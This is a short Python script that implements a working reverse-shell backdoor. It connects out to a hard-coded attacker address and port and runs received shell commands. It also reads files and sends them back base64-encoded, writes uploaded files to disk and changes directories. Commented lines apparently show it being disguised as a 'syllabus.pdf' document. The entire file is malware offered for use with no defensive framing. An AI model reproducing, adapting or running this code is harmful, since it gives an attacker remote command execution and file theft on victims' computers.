#!/usr/bin/env python
import socket
import subprocess
import json
import base64
import sys
import os
import shutil



class Backdoor:
	def  __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def run(self):
		while True:
			received_data = self.reliable_receive()
			try:
				if received_data[0] == "exit":
						self.connection.close()
						sys.exit()
				elif received_data[0] == "cd":
						output_data = self.change_working_directory_to(received_data[1])
				elif received_data[0] == "download":
						output_data = self.read_file(received_data[1])
				elif received_data[0] == "upload":
						output_data = self.write_file(received_data[1], received_data[2])

				else:
						output_data = self.command(received_data)
			except Exception:
				output_data = "[-] Error during command execution."
			self.reliable_send(output_data)


	def write_file(self, path ,content):
		with open(path, "wb") as file :
			file.write(base64.b64decode(content))
			#file.write(content)
			return "[+] Upload successful."
			
        

	def reliable_send(self, data):
		#print(data)
		json_data = json.dumps(str(data))
		self.connection.send(bytes(json_data, 'utf-8'))
        
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				temp = self.connection.recv(1024)
				json_data = json_data + temp.decode('utf-8')
				return json.loads(json_data)
			except ValueError :
				continue


	def command(self, received_data):
		try:
			#DEVNULL = open(os.devnull, 'wb')
			output_data = subprocess.check_output(received_data, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
			output_data = output_data.decode('utf-8')
			return output_data
		except subprocess.CalledProcessError:
			return "Error during command execution."
		

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] change_working_directory_to " + path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

#file_name = sys._MEIPASS + "\syllabus.pdf"
#subprocess.Popen(file_name,shell=True)

my_backdoor = Backdoor("192.168.0.1", 4444)        #change ip 
my_backdoor.run()




